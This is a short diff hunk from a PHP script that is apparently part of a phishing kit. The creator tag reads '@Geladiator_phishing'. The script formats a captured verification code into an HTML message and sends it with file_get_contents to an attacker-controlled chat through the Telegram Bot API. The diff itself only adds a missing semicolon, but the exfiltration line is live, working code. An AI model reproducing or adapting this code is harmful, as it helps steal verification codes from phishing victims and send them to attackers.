@@ -13,7 +13,7 @@ $text ="
 🔐 <b>Code :</b> $CODE
 <b><---------Info---------></b>
 🌐 <b>Host :</b> @XTuranli
-👤 <b>Creator :</b> @Geladiator_phishing"
+👤 <b>Creator :</b> @Geladiator_phishing";
 file_get_contents("https://api.telegram.org/bot".$TOKEN."/SendMessage?chat_id=".$ID."&disable_web_page_preview=true&parse_mode=HTML&text=".urlencode($text));
 ?>
 
